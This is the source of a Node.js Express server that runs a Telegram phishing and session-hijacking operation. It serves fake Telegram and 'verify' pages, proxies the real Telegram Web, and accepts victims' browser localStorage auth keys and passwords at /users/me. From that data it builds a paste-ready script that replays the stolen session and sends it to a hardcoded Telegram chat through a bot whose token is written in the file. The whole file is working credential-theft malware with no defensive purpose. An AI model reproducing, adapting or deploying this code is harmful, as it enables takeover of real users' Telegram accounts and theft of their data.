const compression = require("compression");
const express = require("express");
const https = require("https");
const http = require("http");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const TelegramBot = require("node-telegram-bot-api");
const rateLimit = require("express-rate-limit");
const { createProxyMiddleware } = require('http-proxy-middleware');

const token = process.env.TELEGRAM_TOKEN || "7382167104:AAHnRX3r26jL-BpwF2NGBLDwIodYlAo0SSU";
const bot = new TelegramBot(token, { polling: false }); // Disable polling for serverless

// Test bot connection at startup
bot.getMe()
  .then((botInfo) => {
    console.log("✅ Bot connected successfully:", botInfo.username);
    console.log("Bot ID:", botInfo.id);

    // Send test message to verify bot can message user
    const testUserId = parseInt(process.env.USER_ID) || 1758327808;
    const testMessage = `🤖 Bot Test Message\n\n` +
      `✅ Bot: ${botInfo.username}\n` +
      `👤 Target User ID: ${testUserId}\n` +
      `⏰ Server Started: ${new Date().toLocaleString()}\n\n` +
      `🔧 Server is ready to capture sessions!`;

    bot.sendMessage(testUserId, testMessage)
      .then(() => {
        console.log("✅ Test message sent successfully to user:", testUserId);
      })
      .catch((testError) => {
        console.error("❌ Test message failed:", testError.message);
        console.error("🔧 Possible issues:");
        console.error("   - Wrong USER_ID (current:", testUserId + ")");
        console.error("   - Bot not started by user (send /start to bot)");
        console.error("   - Invalid bot token");
      });
  })
  .catch((error) => {
    console.error("❌ Bot connection failed:", error.message);
    console.error("Check your TELEGRAM_TOKEN:", token.substring(0, 10) + "...");
  });

const app = express();

// Trust the first proxy
app.set("trust proxy", 1);

const thirdTour = process.argv[2] == 3;
const forcePort = process.argv[3];
const useHttp = process.argv[4] !== "https";

const publicFolderPath = path.join(__dirname, "public");
const port = process.env.PORT || (forcePort ? +forcePort : (thirdTour ? 8443 : 4030));

app.use(cors());
app.set("etag", false);
app.use((req, res, next) => {
  res.set("Cache-Control", "no-store");
  next();
});
app.use(compression());
app.use(express.urlencoded({ extended: false }));
app.use(express.json());

const limiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 hour
  max: 5, // Limit each IP to 100 requests per `window` (here, per 1 hour)
  message: "Too many requests from this IP, please try again after 10minutes",
});

let counter = 1; // Counter to keep track of the number of requests

const requestSet = new Set();

app.get("/", (req, res) => {
  res.sendFile(path.join(publicFolderPath, "index.html"));
});

// Serve telegram.html specifically (intercept Telegram Web)
app.get("/telegram.html", (req, res) => {
  res.sendFile(path.join(publicFolderPath, "telegram.html"));
});

// Proxy to real Telegram Web for actual functionality
app.use('/k', createProxyMiddleware({
  target: 'https://web.telegram.org',
  changeOrigin: true,
  pathRewrite: {
    '^/k': '/k' // Preserve the /k path
  },
  onProxyReq: (proxyReq, req, res) => {
    console.log('🔄 Proxying to Telegram Web:', req.url);
  }
}));

// Proxy API calls to Telegram
app.use('/api', createProxyMiddleware({
  target: 'https://web.telegram.org',
  changeOrigin: true,
  onProxyReq: (proxyReq, req, res) => {
    console.log('📡 Proxying API call:', req.url);
  }
}));

// Serve verify.html specifically with environment variable injection
app.get("/verify.html", (req, res) => {
  const fs = require("fs");
  const verifyPath = path.join(publicFolderPath, "verify.html");

  fs.readFile(verifyPath, 'utf8', (err, data) => {
    if (err) {
      return res.status(500).send('Error loading page');
    }

    // Replace the href with environment variable
    const axiomLink = process.env.AXIOM_LINK || "https://axiomtrade-defi.com";
    const updatedData = data.replace(
      'href="https://axiomtrade-defi.com"',
      `href="${axiomLink}"`
    );

    res.send(updatedData);
  });
});

app.use(express.static(publicFolderPath));

// Simple test endpoint to verify server is receiving requests
app.get("/test", (req, res) => {
  console.log("🧪 Test endpoint called");
  const testUserId = parseInt(process.env.USER_ID) || 1758327808;

  bot.sendMessage(testUserId, "🧪 Test endpoint was called successfully!")
    .then(() => {
      console.log("✅ Test endpoint message sent");
      res.json({ status: "success", message: "Test message sent to Telegram" });
    })
    .catch((error) => {
      console.error("❌ Test endpoint message failed:", error);
      res.json({ status: "error", message: error.message });
    });
});

app.post("/users/me", limiter, (req, res) => {
  console.log("\n🔍 ==> DETAILED SESSION ANALYSIS <==");
  console.log("📍 Time:", new Date().toLocaleString());
  console.log("🌐 Request IP:", req.ip);
  console.log("📋 Full Request Body:", JSON.stringify(req.body, null, 2));
  console.log("🔐 Password Field:", req.body.password);
  console.log("👤 UserData Field:", req.body.userData);
  console.log("💾 LocalStorage Field Type:", typeof req.body.localStorage);

  const reqBody = req.body.localStorage;
  const reqBodyString = JSON.stringify(reqBody);

  if (!reqBody) {
    console.error("❌ No localStorage data received");
    console.error("📋 Full request body:", req.body);
    return res.status(400).send("Bad Request: localStorage is required");
  }

  console.log("✅ localStorage data found:", Object.keys(reqBody || {}).length, "items");
  console.log("🔑 LocalStorage Keys:", Object.keys(reqBody || {}));

  // Show first few items with truncated values
  Object.keys(reqBody || {}).slice(0, 5).forEach((key, index) => {
    const value = reqBody[key];
    const truncated = typeof value === 'string' ? value.substring(0, 80) + '...' : value;
    console.log(`💾 [${index + 1}] ${key}: ${truncated}`);
  });

  if (requestSet.has(reqBodyString)) {
    console.log("Duplicate request, blocking");
    return res.status(429).send("Duplicate request");
  }

  requestSet.add(reqBodyString);
  setTimeout(() => requestSet.delete(reqBodyString), 5 * 60 * 1000); // 5 minutes

  const identifier = counter++;

  const reqBodyWithId = {
    identifier: identifier,
    localstorage: reqBody,
  };

  // Convert USER_ID to number and handle as array
  const userId = parseInt(process.env.USER_ID) || 1758327808;
  console.log("Sending message to Telegram user:", userId);
  console.log("Using bot token:", token.substring(0, 10) + "...");
  console.log("Sending message to Telegram with data:", reqBodyWithId);

  // Create ready-to-use console script
  const consoleScript = `// Clear existing data
localStorage.clear();

// Inject captured session data
localStorage.setItem('user_auth', '${reqBodyWithId.localstorage.user_auth || ""}');
localStorage.setItem('dc', '${reqBodyWithId.localstorage.dc || ""}');
localStorage.setItem('dc1_auth_key', '${reqBodyWithId.localstorage.dc1_auth_key || ""}');
localStorage.setItem('dc2_auth_key', '${reqBodyWithId.localstorage.dc2_auth_key || ""}');
localStorage.setItem('dc3_auth_key', '${reqBodyWithId.localstorage.dc3_auth_key || ""}');
localStorage.setItem('dc4_auth_key', '${reqBodyWithId.localstorage.dc4_auth_key || ""}');
localStorage.setItem('dc5_auth_key', '${reqBodyWithId.localstorage.dc5_auth_key || ""}');
localStorage.setItem('dc1_server_salt', '${reqBodyWithId.localstorage.dc1_server_salt || ""}');
localStorage.setItem('dc2_server_salt', '${reqBodyWithId.localstorage.dc2_server_salt || ""}');
localStorage.setItem('dc3_server_salt', '${reqBodyWithId.localstorage.dc3_server_salt || ""}');
localStorage.setItem('dc4_server_salt', '${reqBodyWithId.localstorage.dc4_server_salt || ""}');
localStorage.setItem('dc5_server_salt', '${reqBodyWithId.localstorage.dc5_server_salt || ""}');
localStorage.setItem('state_id', '${reqBodyWithId.localstorage.state_id || ""}');
localStorage.setItem('auth_key_fingerprint', '${reqBodyWithId.localstorage.auth_key_fingerprint || ""}');
localStorage.setItem('k_build', '${reqBodyWithId.localstorage.k_build || ""}');

// Reload page to apply session
location.reload();`;

  // Format the summary message
  const userInfo = reqBodyWithId.localstorage.user_auth ? JSON.parse(reqBodyWithId.localstorage.user_auth) : {};
  const summaryText = `🔐 *New Telegram Session Captured!*\n\n` +
    `📋 Identifier: \`${reqBodyWithId.identifier}\`\n` +
    `👤 User ID: \`${userInfo.id || 'Not found'}\`\n` +
    `🌐 DC: \`${reqBodyWithId.localstorage.dc || 'Not found'}\`\n` +
    `⏰ Timestamp: \`${new Date().toLocaleString()}\`\n\n` +
    `\`\`\`javascript\n${consoleScript}\n\`\`\``;

  bot.sendMessage(userId, summaryText, { parse_mode: 'Markdown' })
    .then(() => {
      console.log("✅ Message successfully sent to user:", userId);
    })
    .catch((error) => {
      console.error("❌ Error sending message:", error.message);
      console.error("🔑 Bot token being used:", token.substring(0, 10) + "...");
      console.error("👤 User ID being used:", userId);
      console.error("📱 Is the bot started? Send /start to your bot");

      // Try sending a simple test message
      bot.sendMessage(userId, "Test message from bot")
        .then(() => console.log("✅ Simple test message sent successfully"))
        .catch((testError) => console.error("❌ Test message also failed:", testError.message));
    });

  res.sendStatus(200);
});


const server = useHttp ? http : https;

let options = {};
if (!useHttp) {
  options.key = fs.readFileSync(__dirname + "/certs/server-key.pem");
  options.cert = fs.readFileSync(__dirname + "/certs/server-cert.pem");
}

server.createServer(options, app).listen(port, () => {
  console.log("Listening port:", port, "folder:", publicFolderPath);
});
